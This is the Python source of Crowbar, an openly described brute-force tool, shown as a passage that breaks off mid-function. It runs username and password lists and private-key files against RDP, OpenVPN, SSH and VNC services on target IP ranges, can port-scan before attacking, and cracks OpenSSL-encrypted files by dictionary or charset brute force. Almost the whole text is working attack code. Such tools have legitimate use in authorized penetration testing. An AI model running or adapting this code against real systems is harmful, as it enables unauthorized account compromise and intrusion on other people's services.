try:
    import os
    import re
    import sys
    import shlex
    import signal
    import string
    import random
    import paramiko
    import argparse
    import tempfile
    import subprocess
    from time import time
    from os import truncate
    from lib.nmap import Nmap
    from lib.core.common import *
    from lib.core.logger import Logger
    from lib.core.threadpool import ThreadPool
    from lib.core.exceptions import CrowbarExceptions
    from lib.core.iprange import IpRange, InvalidIPAddress
except Exception as err:
    from lib.core.exceptions import CrowbarExceptions

    raise CrowbarExceptions(str(err))

__version__ = '0.4.1'
__banner__ = 'Crowbar v%s' % (__version__)


class AddressAction(argparse.Action):
    def __call__(self, parser, args, values, option=None):

        if args.username:
            if len(args.username) > 1:
                args.username = "\"" + ' '.join([str(line) for line in args.username]) + "\""
            else:
                args.username = args.username[0]

            warning = {args.username: "-U", args.passwd: "-C", args.server: "-S"}
            for _ in warning.keys():
                if _ and os.path.isfile(_):
                    mess = "%s is not a valid option. Please use %s option" % (_, warning[_])
                    raise CrowbarExceptions(mess)

        if args.brute == "sshkey":
            if args.key_file is None:
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -k/--key: expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.username is None) and (args.username_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -u/--username or -U/--username_file expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.server is None) and (args.server_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -s/--server or -S/--server_file expected one argument """
                raise CrowbarExceptions(mess)

        elif args.brute == "rdp":
            if (args.username is None) and (args.username_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -u/--username or -U/--username_file expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.passwd is None) and (args.passwd_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -c/--passwd or -C/--passwdfile expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.server is None) and (args.server_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -s/--server or -S/--server_file expected one argument """
                raise CrowbarExceptions(mess)

        elif args.brute == "vnckey":
            if args.key_file is None:
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -k/--key: expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.server is None) and (args.server_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -s/--server or -S/--server_file expected one argument """
                raise CrowbarExceptions(mess)

        elif args.brute == "openvpn":
            if args.config is None:
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -m/--config expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.server is None) and (args.server_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -s/--server or -S/--server_file expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.username is None) and (args.username_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -u/--username or -U/--username_file expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.passwd is None) and (args.passwd_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -c/--passwd or -C/--passwdfile expected one argument """
                raise CrowbarExceptions(mess)
        
        elif args.brute == "openssl":
            if (args.key_file is None) and (args.input_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument -k/--keyfile or --infile expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.input_file) and (args.output_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument --outfile expected one argument """
                raise CrowbarExceptions(mess)
            elif (args.output_file) and (args.input_file is None):
                mess = """ Usage: use --help for further information\ncrowbar.py: error: argument --infile expected one argument """
                raise CrowbarExceptions(mess)
            


class Main:
    is_success = 0

    def __init__(self):
        self.services = {"openvpn": self.openvpn, "rdp": self.rdp, "sshkey": self.sshkey, "vnckey": self.vnckey, "openssl": self.ssl}
        self.crowbar_readme = "https://github.com/galkan/crowbar/blob/master/README.md"

        self.openvpn_path = "/usr/sbin/openvpn"
        self.vpn_failure = re.compile("SIGTERM\[soft,auth-failure\] received, process exiting")
        self.vpn_success = re.compile("Initialization Sequence Completed")
        self.vpn_remote_regex = re.compile("^\s+remote\s[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\s[0-9]{1,3}")
        self.vpn_warning = "Warning! Both \"remote\" options were used at the same time. But command line \"remote\" options will be used!"
        self.vpn_error_in_use = "Address already in use (errno=98)"

        self.xfreerdp_path = "/usr/bin/xfreerdp"
        self.rdp_success = "Authentication only, exit status 0"
        self.rdp_success_ins_priv = "insufficient access privileges"
        self.rdp_success_account_locked = "alert internal error"
        self.rdp_error_host_down = "ERRCONNECT_CONNECT_FAILED"  # [0x00020006] [0x00020014]
        self.rdp_error_display = "Please check that the \$DISPLAY environment variable is properly set."

        self.vncviewer_path = "/usr/bin/vncviewer"
        self.vnc_success = "Authentication successful"

        self.openssl_path = "/usr/bin/openssl"
        self.ssl_failure = "bad decrypt"
        self.ssl_password = ""
        self.ssl_cipher = ""
        self.ssl_digest = ""
        self.filecheck_path = "/usr/bin/file"
        self.iter_required = 0
        self.rand_char_string = string.ascii_letters + string.digits
        self.test_list = []

        description = "Crowbar is a brute force tool which supports OpenVPN, Remote Desktop Protocol, SSH Private Keys and VNC Keys."
        usage = "Usage: use --help for further information"

        parser = argparse.ArgumentParser(description=description, usage=usage)
        parser.add_argument('-b', '--brute', dest='brute', help='Target service', choices=self.services.keys(),
                            required=True)
        parser.add_argument('-s', '--server', dest='server', action='store', help='Static target')
        parser.add_argument('-S', '--serverfile', dest='server_file', action='store',
                            help='Multiple targets stored in a file')
        parser.add_argument('-u', '--username', dest='username', action='store', nargs='+',
                            help='Static name to login with')
        parser.add_argument('-U', '--usernamefile', dest='username_file', action='store',
                            help='Multiple names to login with, stored in a file')
        parser.add_argument('-n', '--number', dest='thread', action='store',
                            help='Number of threads to be active at once', default=5, type=int)
        parser.add_argument('-l', '--log', dest='log_file', action='store', help='Log file (only write attempts)',
                            metavar='FILE',
                            default="crowbar.log")
        parser.add_argument('-o', '--output', dest='output', action='store', help='Output file (write everything else)',
                            metavar='FILE',
                            default="crowbar.out")
        parser.add_argument('-c', '--passwd', dest='passwd', action='store', help='Static password to login with')
        parser.add_argument('-C', '--passwdfile', dest='passwd_file', action='store',
                            help='Multiple passwords to login with, stored in a file',
                            metavar='FILE')
        parser.add_argument('-t', '--timeout', dest='timeout', action='store',
                            help='[SSH] How long to wait for each thread (seconds)', default=10, type=int)
        parser.add_argument('-p', '--port', dest='port', action='store',
                            help='Alter the port if the service is not using the default value', type=int)
        parser.add_argument('-k', '--keyfile', dest='key_file', action='store',
                            help='[SSH/VNC/SSL] (Private) Key file or folder containing multiple files')
        parser.add_argument('-m', '--config', dest='config', action='store', help='[OpenVPN] Configuration file ')
        parser.add_argument('-d', '--discover', dest='discover', action='store_true',
                            help='Port scan before attacking open ports', default=False)
        parser.add_argument('-v', '--verbose', dest='verbose', action="count",
                            help='Enable verbose output (-vv for more)', default=False)
        parser.add_argument('-D', '--debug', dest='debug', action='store_true', help='Enable debug mode', default=False)
        parser.add_argument('-q', '--quiet', dest='quiet', action='store_true', help='Only display successful logins',
                            default=False)
        parser.add_argument('--infile', dest='input_file', action='store', help='[SSL] Encrypted file location')
        parser.add_argument('--outfile', dest='output_file', action='store', help='[SSL] Location of output')
        parser.add_argument('--cipher', dest='cipher', action='store', help="[SSL] Cipher used for decryption. Type 'openssl enc -list' for all available ciphers. Default: aes-128-cbc. '*' to indicate all.")
        parser.add_argument('--cipherfile', dest='cipher_file', action='store', help='[SSL] File containing list of ciphers to test')
        parser.add_argument('--digest', dest='message_digest', action='store', help="[SSL] Message digest used for decryption. Type 'openssl dgst -list' for all available message digests. Default: sha256. '*' to indicate all.")
        parser.add_argument('--digestfile', dest='message_digest_file', action='store', help='[SSL] File containing list of message digests to test')
        parser.add_argument('--min', dest='min_char', action='store', help='[SSL] Password minimum length to brute-force. Default: 1')
        parser.add_argument('--max', dest='max_char', action='store', help='[SSL] Password maximum length to brute-force. Default: 16')
        parser.add_argument('--charset', dest='charset', action='store', help="[SSL] Charset used to brute force. Default: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'") 
        parser.add_argument('--beginwith', dest='begin_with', action='store', help="[SSL] Specify password begins with what characters")
        parser.add_argument('--endwith', dest='end_with', action='store', help="[SSL] Specify password ends with what characters")
        # parser.add_argument('--updatetime', dest='update_time', action='store', help='[SSL] Display progress every x seconds. Default 15 seconds.')
        parser.add_argument('options', nargs='*', action=AddressAction)
        

        try:
            self.args = parser.parse_args()
        except Exception as err:
            raise CrowbarExceptions(str(err))

        self.ip_list = []

        if self.args.discover:
            self.nmap = Nmap()
        elif self.args.brute != "openssl":
            iprange = IpRange()

            try:
                if self.args.server is not None:
                    for _ in self.args.server.split(","):
                        for ip in iprange.iprange(_):
                            self.ip_list.append(ip)
                else:
                    for _ in open(self.args.server_file, "r"):
                        for ip in iprange.iprange(_):
                            if not ip in self.ip_list:
                                self.ip_list.append(ip)
            except IOError:
                mess = "File: %s cannot be opened!" % os.path.abspath(self.args.server_file)
                raise CrowbarExceptions(mess)
            except:
                mess = "Invalid IP Address! Please use IP/CIDR notation <192.168.37.37/32, 192.168.1.0/24>"
                raise CrowbarExceptions(mess)

        if self.args.verbose:
            self.logger = Logger(self.args.log_file, self.args.output, True)
        else:
            self.logger = Logger(self.args.log_file, self.args.output)

        self.logger.output_file("START")
        if not self.args.quiet:
            self.logger.output_file(__banner__)

        if self.args.verbose:
            self.logger.output_file("Brute Force Type: %s" % self.args.brute)
            self.logger.output_file("     Output File: %s" % os.path.abspath(self.args.output))
            self.logger.output_file("        Log File: %s" % os.path.abspath(self.args.log_file))
            self.logger.output_file("   Discover Mode: %s" % self.args.discover)
            self.logger.output_file("    Verbose Mode: %s" % self.args.verbose)
            self.logger.output_file("      Debug Mode: %s" % self.args.debug)

    def openvpnlogin(self, ip, username, password, brute_file, port):
        brute_file_name = brute_file.name
        brute_file.seek(0)

        openvpn_cmd = "%s --remote %s %s --auth-user-pass %s --tls-exit --connect-retry-max 0 --config %s" % (
            self.openvpn_path, ip, port, brute_file_name, self.args.config)

        if self.args.verbose == 2:
            self.logger.output_file("CMD: %s" % openvpn_cmd)

        proc = subprocess.Popen(shlex.split(openvpn_cmd), shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        brute = "LOG-OPENVPN: " + ip + ":" + str(port) + " - " + username + ":" + password + " - " + brute_file_name
        self.logger.log_file(brute)

        # For every line out
        for line in proc.stdout:
            # Is debug enabled
            if self.args.debug:
                self.logger.output_file(line.decode("utf-8").rstrip())

            # Success
            if re.search(self.vpn_success, str(line)):
                result = bcolors.OKGREEN + "OPENVPN-SUCCESS: " + bcolors.ENDC + bcolors.OKBLUE + ip + ":" + str(
                    port) + " - " + username + ":" + password + bcolors.ENDC
                self.logger.output_file(result)
                Main.is_success = 1
                os.kill(proc.pid, signal.SIGQUIT)
            # Errors
            elif re.search(self.vpn_error_in_use, str(line)):
                mess = "Already connected to a VPN"
                raise CrowbarExceptions(mess)
        brute_file.close()

    def openvpn(self):
        port = 443  # TCP 443, TCP 943, UDP 1194

        if not 'SUDO_UID' in os.environ.keys():
            mess = "OpenVPN requires super user privileges"
            raise CrowbarExceptions(mess)

        if not os.path.exists(self.openvpn_path):
            mess = "openvpn: %s path doesn't exists on the system!" % os.path.abspath(self.openvpn_path)
            raise CrowbarExceptions(mess)

        if self.args.port is not None:
            port = self.args.port

        if self.args.discover:
            if not self.args.quiet:
                self.logger.output_file("Discovery mode - port scanning: %s" % self.args.server)
            self.ip_list = self.nmap.port_scan(self.args.server, port)

        try:
            pool = ThreadPool(int(self.args.thread))
        except Exception as err:
            raise CrowbarExceptions(str(err))

        for config_line in open(self.args.config, "r"):
            if re.search(self.vpn_remote_regex, config_line):
                raise CrowbarExceptions(self.vpn_warning)

        for ip in self.ip_list:
            if not self.args.quiet:
                self.logger.output_file("Trying %s:%s" % (ip, port))

            if self.args.username_file:
                try:
                    userfile = open(self.args.username_file, "r").read().splitlines()
                except:
                    mess = "File: %s doesn't exists!" % os.path.abspath(self.args.username_file)
                    raise CrowbarExceptions(mess)

                for user in userfile:
                    if self.args.passwd_file:
                        try:
                            passwdfile = open(self.args.passwd_file, "r").read().splitlines()
                        except:
                            mess = "File: %s doesn't exists!" % os.path.abspath(self.args.passwd_file)
                            raise CrowbarExceptions(mess)

                        for password in passwdfile:
                            brute_file = tempfile.NamedTemporaryFile(mode='w+t')
                            brute_file.write(user + "\n")
                            brute_file.write(password + "\n")
                            pool.add_task(self.openvpnlogin, ip, user, password, brute_file, port)
                    else:
                        brute_file = tempfile.NamedTemporaryFile(mode='w+t')
                        brute_file.write(user + "\n")
                        brute_file.write(self.args.passwd + "\n")
                        pool.add_task(self.openvpnlogin, ip, user, self.args.passwd, brute_file, port)
            else:
                if self.args.passwd_file:
                    try:
                        passwdfile = open(self.args.passwd_file, "r").read().splitlines()
                    except:
                        mess = "File: %s doesn't exists!" % os.path.abspath(self.args.passwd_file)
                        raise CrowbarExceptions(mess)

                    for password in passwdfile:
                        brute_file = tempfile.NamedTemporaryFile(mode='w+t')
                        brute_file.write(self.args.username + "\n")
                        brute_file.write(password + "\n")
                        pool.add_task(self.openvpnlogin, ip, self.args.username, password, brute_file, port)
                else:
                    brute_file = tempfile.NamedTemporaryFile(mode='w+t')
                    brute_file.write(self.args.username + "\n")
                    brute_file.write(self.args.passwd + "\n")
                    pool.add_task(self.openvpnlogin, ip, self.args.username, self.args.passwd, brute_file, port)
        pool.wait_completion()

    def vnclogin(self, ip, port, keyfile):
        vnc_cmd = "%s -passwd %s %s:%s" % (self.vncviewer_path, keyfile, ip, port)

        if self.args.verbose == 2:
            self.logger.output_file("CMD: %s" % vnc_cmd)

        proc = subprocess.Popen(shlex.split(vnc_cmd), shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        brute = "LOG-VNC: " + ip + ":" + str(port) + " - " + keyfile
        self.logger.log_file(brute)

        # For every line out
        for line in proc.stdout:
            # Is debug enabled
            if self.args.debug:
                self.logger.output_file(line.decode("utf-8").rstrip())

            if re.search(self.vnc_success, str(line)):
                os.kill(proc.pid, signal.SIGQUIT)
                result = bcolors.OKGREEN + "VNC-SUCCESS: " + bcolors.ENDC + bcolors.OKBLUE + ip + ":" + str(
                    port) + " - " + keyfile + bcolors.ENDC
                self.logger.output_file(result)
                Main.is_success = 1
                break

    def vnckey(self, *options):
        port = 5901

        if not os.path.exists(self.vncviewer_path):
            mess = "vncviewer: %s path doesn't exists on the system!" % os.path.abspath(self.vncviewer_path)
            raise CrowbarExceptions(mess)

        if self.args.port is not None:
            port = self.args.port

        if self.args.discover:
            if not self.args.quiet:
                self.logger.output_file("Discovery mode - port scanning: %s" % self.args.server)
            self.ip_list = self.nmap.port_scan(self.args.server, port)

        if not os.path.isfile(self.args.key_file):
            mess = "Key file: \"%s\" doesn't exists." % os.path.abspath(self.args.key_file)
            raise CrowbarExceptions(mess)

        try:
            pool = ThreadPool(int(self.args.thread))
        except Exception as err:
            raise CrowbarExceptions(str(err))

        for ip in self.ip_list:
            if not self.args.quiet:
                self.logger.output_file("Trying %s:%s" % (ip, port))
            pool.add_task(self.vnclogin, ip, port, self.args.key_file)
        pool.wait_completion()

    def rdplogin(self, ip, user, password, port):
        rdp_cmd = "%s /v:%s /port:%s /u:%s /p:%s /cert-ignore +auth-only" % (
            self.xfreerdp_path, ip, port, user, password)

        if self.args.verbose == 2:
            self.logger.output_file("CMD: %s" % rdp_cmd)

        # stderr to stdout
        proc = subprocess.Popen(shlex.split(rdp_cmd), shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        brute = "LOG-RDP: " + ip + ":" + str(port) + " - " + user + ":" + password
        self.logger.log_file(brute)

        # For every line out
        for line in proc.stdout:
            # Is debug enabled
            if self.args.debug:
                self.logger.output_file(line.decode("utf-8").rstrip())

            # Success
            if re.search(self.rdp_success, str(line)):
                result = bcolors.OKGREEN + "RDP-SUCCESS : " + bcolors.ENDC + bcolors.OKBLUE + ip + ":" + str(
                    port) + " - " + user + ":" + password + bcolors.ENDC
                self.logger.output_file(result)
                Main.is_success = 1
                break
            elif re.search(self.rdp_success_ins_priv, str(line)):
                result = bcolors.OKGREEN + "RDP-SUCCESS (INSUFFICIENT PRIVILEGES) : " + bcolors.ENDC + bcolors.OKBLUE + ip + ":" + str(
                    port) + " - " + user + ":" + password + bcolors.ENDC
                self.logger.output_file(result)
                Main.is_success = 1
                break
            elif re.search(self.rdp_success_account_locked, str(line)):
                result = bcolors.OKGREEN + "RDP-SUCCESS (ACCOUNT_LOCKED_OR_PASSWORD_EXPIRED) : " + bcolors.ENDC + bcolors.OKBLUE + ip + ":" + str(
                    port) + " - " + user + ":" + password + bcolors.ENDC
                self.logger.output_file(result)
                Main.is_success = 1
                break
            # Errors
            elif re.search(self.rdp_error_display, str(line)):
                mess = "Please check \$DISPLAY is properly set. See README.md %s" % self.crowbar_readme
                raise CrowbarExceptions(mess)
            elif re.search(self.rdp_error_host_down, str(line)):
                mess = "Host isn't up"
                raise CrowbarExceptions(mess)

    def rdp(self):
        port = 3389

        if not os.path.exists(self.xfreerdp_path):
            mess = "xfreerdp: %s path doesn't exists on the system!" % os.path.abspath(self.xfreerdp_path)
            raise CrowbarExceptions(mess)

        if self.args.port is not None:
            port = self.args.port

        if self.args.discover:
            if not self.args.quiet:
                self.logger.output_file("Discovery mode - port scanning: %s" % self.args.server)
            self.ip_list = self.nmap.port_scan(self.args.server, port)

        try:
            pool = ThreadPool(int(self.args.thread))
        except Exception as err:
            raise CrowbarExceptions(str(err))

        for ip in self.ip_list:
            if not self.args.quiet:
                self.logger.output_file("Trying %s:%s" % (ip, port))

            if self.args.username_file:
                try:
                    userfile = open(self.args.username_file, "r").read().splitlines()
                except:
                    mess = "File: %s doesn't exists!" % os.path.abspath(self.args.username_file)
                    raise CrowbarExceptions(mess)

                for user in userfile:
                    if ' ' in user:
                        user = '"' + user + '"'

                    if self.args.passwd_file:
                        try:
                            passwdfile = open(self.args.passwd_file, "r").read().splitlines()
                        except:
                            mess = "File: %s doesn't exists" % os.path.abspath(self.args.passwd_file)
                            raise CrowbarExceptions(mess)

                        for password in passwdfile:
                            pool.add_task(self.rdplogin, ip, user, password, port)
                    else:
                        pool.add_task(self.rdplogin, ip, user, self.args.passwd, port)
            else:
                if self.args.passwd_file:
                    try:
                        passwdfile = open(self.args.passwd_file, "r").read().splitlines()
                    except:
                        mess = "File: %s doesn't exists" % os.path.abspath(self.args.passwd_file)
                        raise CrowbarExceptions(mess)

                    for password in passwdfile:
                        pool.add_task(self.rdplogin, ip, self.args.username, password, port)
                else:
                    pool.add_task(self.rdplogin, ip, self.args.username, self.args.passwd, port)
        pool.wait_completion()

    def sshlogin(self, ip, port, user, keyfile, timeout):
        try:
            ssh = paramiko.SSHClient()
            paramiko.util.log_to_file("/dev/null")
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        except:
            pass
        else:
            brute = "LOG-SSH: " + ip + ":" + str(port) + " - " + user + ":" + keyfile + ":" + str(timeout)
            self.logger.log_file(brute)

            try:
                ssh.connect(ip, port, username=user, password=None, pkey=None, key_filename=keyfile, timeout=timeout,
                            allow_agent=False, look_for_keys=False)
                result = bcolors.OKGREEN + "SSH-SUCCESS: " + bcolors.ENDC + bcolors.OKBLUE + ip + ":" + str(
                    port) + " - " + user + ":" + keyfile + bcolors.ENDC
                self.logger.output_file(result)
                Main.is_success = 1
            except:
                pass

    def sshkey(self):
        port = 22

        if self.args.port is not None:
            port = self.args.port

        if self.args.discover:
            if not self.args.quiet:
                self.logger.output_file("Discovery mode - port scanning: %s" % self.args.server)
            self.ip_list = self.nmap.port_scan(self.args.server, port)

        try:
            pool = ThreadPool(self.args.thread)
        except Exception as err:
            raise CrowbarExceptions(str(err))

        if not os.path.exists(self.args.key_file):
            mess = "Key file/folder: \"%s\" doesn't exists." % os.path.abspath(self.args.key_file)
            raise CrowbarExceptions(mess)

        for ip in self.ip_list:
            if not self.args.quiet:
                self.logger.output_file("Trying %s:%s" % (ip, port))

            if self.args.username_file:
                try:
                    userfile = open(self.args.username_file, "r").read().splitlines()
                except:
                    mess = "File: %s doesn't exists!" % os.path.abspath(self.args.username_file)
                    raise CrowbarExceptions(mess)

                for user in userfile:
                    if os.path.isdir(self.args.key_file):
                        for dirname, dirnames, filenames in os.walk(self.args.key_file):
                            for keyfile in filenames:
                                keyfile_path = self.args.key_file + "/" + keyfile
                                if keyfile.endswith('.pub', 4):
                                    self.logger.output_file("LOG-SSH: Skipping Public Key - %s" % keyfile_path)
                                    continue
                                pool.add_task(self.sshlogin, ip, port, user, keyfile_path, self.args.timeout)
                    else:
                        pool.add_task(self.sshlogin, ip, port, user, self.args.key_file, self.args.timeout)
            else:
                if os.path.isdir(self.args.key_file):
                    for dirname, dirnames, filenames in os.walk(self.args.key_file):
                        for keyfile in filenames:
                            keyfile_path = dirname + "/" + keyfile
                            if keyfile.endswith('.pub', 4):
                                self.logger.output_file("LOG-SSH: Skipping Public Key - %s" % keyfile_path)
                                continue
                            pool.add_task(self.sshlogin, ip, port, self.args.username, keyfile_path, self.args.timeout)
                else:
                    pool.add_task(self.sshlogin, ip, port, self.args.username, self.args.key_file, self.args.timeout)
        pool.wait_completion()

    def sslbrute(self, cipher, digest, infile, outfile, password, keyfile, output=True):
        
        if keyfile:
            if infile:
                ssl_cmd = "openssl rsautl -decrypt -inkey %s -in %s -out %s -passin pass:'%s'" % (
                    keyfile, infile, outfile, password
                )

            else:
                ssl_cmd = "openssl rsautl -decrypt -inkey %s -in temptest.txt -passin pass:'%s'" % (
                    keyfile, password
                )
        
        else:
            ssl_cmd = "%s enc -d -%s -md %s -in %s -out %s -k '%s'" % (
                self.openssl_path, cipher, digest, infile, outfile, password
            )

        if self.args.verbose == 2:
            self.logger.output_file("CMD: %s" % ssl_cmd)

        # stderr to stdout
        proc = subprocess.Popen(shlex.split(ssl_cmd), shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        if keyfile:
            
            if infile:
                success1 = True
                special = False
                for line in proc.stdout:
                    if re.search("error", str(line)):
                        success1 = False
                    if re.search("RSA operation error", str(line)):  # Password for key is found, but file not related to key
                        special = True
            else:
                success1 = False
                special = False
                for line in proc.stdout:
                    if re.search("RSA operation error", str(line)):
                        success1 = True
            
            if success1:
                result = bcolors.OKGREEN + "SSL-SUCCESS : " + bcolors.ENDC + bcolors.OKBLUE + password + bcolors.ENDC + "\033[K"
                if output:
                    print("\033[K", end="\r")
                    self.logger.output_file(result)
                Main.is_success = 1
                self.ssl_password = password
            
            if special:
                result = bcolors.OKGREEN + "SSL-SUCCESS : " + bcolors.ENDC + bcolors.OKBLUE + password + bcolors.ENDC + "\033[93m" + " (Password found for private key, but the input file specified is not encrypted with this key.)" + bcolors.ENDC + "\033[K"
                if output:
                    print("\033[K", end="\r")
                    self.logger.output_file(result)
                Main.is_success = 1
                self.ssl_password = password

        else:

            success1 = True
            success2 = False

            for line in proc.stdout:
                # Failure
                if re.search(self.ssl_failure, str(line)):
                    success1 = False
                
            if success1:
                
                try:
                    char_count = 0
                    printable_count = 0
                    
                    with open(outfile, "r", encoding="ISO-8859-1") as f:
                        for line in f:
                            for char in line:
                                char_count += 1
                                if char in string.printable or char.isspace():
                                    printable_count += 1
                    
                    if printable_count > (char_count / 10) * 9:  # At least 90% are ASCII printable characters
                        success2 = True

                except:
                    pass
                    
                if success2:
                    result = bcolors.OKGREEN + "SSL-SUCCESS : " + bcolors.ENDC + bcolors.OKBLUE + f"Cipher: {cipher}  Digest: {digest}  Password: {password}" + bcolors.ENDC + "\033[K"
                    if output:
                        print("\033[K", end="\r")
                        self.logger.output_file(result)
                    Main.is_success = 1
                    self.ssl_password = password
                    self.ssl_cipher = cipher
                    self.ssl_digest = digest
            
            if output:
                os.remove(outfile)
        
    def ssl(self):

        cipher_list = ['aes-128-cbc', 'aes-128-cfb', 'aes-128-cfb1', 'aes-128-cfb8', 'aes-128-ctr', 'aes-128-ecb', 'aes-128-ofb', 'aes-192-cbc', 'aes-192-cfb', 'aes-192-cfb1', 'aes-192-cfb8', 'aes-192-ctr', 'aes-192-ecb', 'aes-192-ofb', 'aes-256-cbc', 'aes-256-cfb', 'aes-256-cfb1', 'aes-256-cfb8', 'aes-256-ctr', 'aes-256-ecb', 'aes-256-ofb', 'aes128', 'aes128-wrap', 'aes192', 'aes192-wrap', 'aes256', 'aes256-wrap', 'aria-128-cbc', 'aria-128-cfb', 'aria-128-cfb1', 'aria-128-cfb8', 'aria-128-ctr', 'aria-128-ecb', 'aria-128-ofb', 'aria-192-cbc', 'aria-192-cfb', 'aria-192-cfb1', 'aria-192-cfb8', 'aria-192-ctr', 'aria-192-ecb', 'aria-192-ofb', 'aria-256-cbc', 'aria-256-cfb', 'aria-256-cfb1', 'aria-256-cfb8', 'aria-256-ctr', 'aria-256-ecb', 'aria-256-ofb', 'aria128', 'aria192', 'aria256', 'bf', 'bf-cbc', 'bf-cfb', 'bf-ecb', 'bf-ofb', 'blowfish', 'camellia-128-cbc', 'camellia-128-cfb', 'camellia-128-cfb1', 'camellia-128-cfb8', 'camellia-128-ctr', 'camellia-128-ecb', 'camellia-128-ofb', 'camellia-192-cbc', 'camellia-192-cfb', 'camellia-192-cfb1', 'camellia-192-cfb8', 'camellia-192-ctr', 'camellia-192-ecb', 'camellia-192-ofb', 'camellia-256-cbc', 'camellia-256-cfb', 'camellia-256-cfb1', 'camellia-256-cfb8', 'camellia-256-ctr', 'camellia-256-ecb', 'camellia-256-ofb', 'camellia128', 'camellia192', 'camellia256', 'cast', 'cast-cbc', 'cast5-cbc', 'cast5-cfb', 'cast5-ecb', 'cast5-ofb', 'chacha20', 'des', 'des-cbc', 'des-cfb', 'des-cfb1', 'des-cfb8', 'des-ecb', 'des-ede', 'des-ede-cbc', 'des-ede-cfb', 'des-ede-ecb', 'des-ede-ofb', 'des-ede3', 'des-ede3-cbc', 'des-ede3-cfb', 'des-ede3-cfb1', 'des-ede3-cfb8', 'des-ede3-ecb', 'des-ede3-ofb', 'des-ofb', 'des3', 'des3-wrap', 'desx', 'desx-cbc', 'id-aes128-wrap', 'id-aes128-wrap-pad', 'id-aes192-wrap', 'id-aes192-wrap-pad', 'id-aes256-wrap', 'id-aes256-wrap-pad', 'id-smime-alg-CMS3DESwrap', 'rc2', 'rc2-128', 'rc2-40', 'rc2-40-cbc', 'rc2-64', 'rc2-64-cbc', 'rc2-cbc', 'rc2-cfb', 'rc2-ecb', 'rc2-ofb', 'rc4', 'rc4-40', 'seed', 'seed-cbc', 'seed-cfb', 'seed-ecb', 'seed-ofb', 'sm4', 'sm4-cbc', 'sm4-cfb', 'sm4-ctr', 'sm4-ecb', 'sm4-ofb']
        message_digest_list = ['blake2b512', 'blake2s256', 'md4', 'md5', 'md5-sha1', 'ripemd', 'ripemd160', 'rmd160', 'sha1', 'sha224', 'sha256', 'sha3-224', 'sha3-256', 'sha3-384', 'sha3-512', 'sha384', 'sha512', 'sha512-224', 'sha512-256', 'shake128', 'shake256', 'sm3', 'ssl3-md5', 'ssl3-sha1', 'whirlpool']

        if not os.path.exists(self.openssl_path):
            mess = "openssl: %s path doesn't exists on the system!" % os.path.abspath(self.openssl_path)
            raise CrowbarExceptions(mess)

        try:
            pool = ThreadPool(int(self.args.thread))
        except Exception as err:
            raise CrowbarExceptions(str(err))
        
        if self.args.key_file:
            
            if not os.path.exists(os.path.join(os.getcwd(), self.args.key_file)):
                mess = "File: %s doesn't exists" % os.path.abspath(self.args.key_file)
                raise CrowbarExceptions(mess)
            
            if not self.args.cipher_file:
                with open("temptest.txt", "w") as f:  # Temp test file
                    f.write("temp test")

            if self.args.passwd_file:
                
                try:
                    passwdfile = open(self.args.passwd_file, "r", encoding="ISO-8859-1").read().splitlines()
                except:
                    mess = "File: %s doesn't exists" % os.path.abspath(self.args.passwd_file)
                    raise CrowbarExceptions(mess)
                
                self.iter_required = len(passwdfile)
                self.logger.output_file("Iteration(s) required: %s" % self.iter_required)

                total_time = time()

                for password in passwdfile:

                    if not password:
                        continue

                    current_iter = passwdfile.index(password)
                    print("Password:[%s / %s]" % (
                        current_iter, len(passwdfile)), end="\033[K\r"
                    )

                    pool.add_task(self.sslbrute, None, None, self.args.input_file, self.args.output_file, password, self.args.key_file)

            elif self.args.passwd:
                
                total_time = time()
                pool.add_task(self.sslbrute, None, None, self.args.input_file, self.args.output_file, self.args.passwd, self.args.key_file)
                
            else:
                
                if not self.args.min_char:
                    minimum_character = 1  # Default minimum character
                else:
                    minimum_character = int(self.args.min_char)

                if not self.args.max_char:
                    maximum_character = 16  # Default maximum character
                else:
                    maximum_character = int(self.args.max_char)
                
                if not self.args.charset:
                    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"  # Default charset
                else:
                    charset = str(self.args.charset)
                
                if not self.args.begin_with:
                    begin = ""  # Default beginning characters
                else:
                    begin = str(self.args.begin_with)
                
                if not self.args.end_with:
                    end = ""  # Default ending characters
                else:
                    end = str(self.args.end_with)
                
                # Run checks to ensure validity of arguments
                if minimum_character <= 0:
                    mess = "Minimum character cannot be lower or equal to 0!"
                    raise CrowbarExceptions(mess)
                elif minimum_character > maximum_character:
                    mess = "Minimum character specified cannot be lower than that maximum character!"
                    raise CrowbarExceptions(mess)
                elif len(begin) + len(end) >= maximum_character:
                    mess = "Length of beginning and ending characters cannot be same or more than the specified maximum number of characters!"
                    raise CrowbarExceptions(mess)

                if minimum_character > len(begin) + len(end):
                    minimum_character -= len(begin) + len(end)
                else:
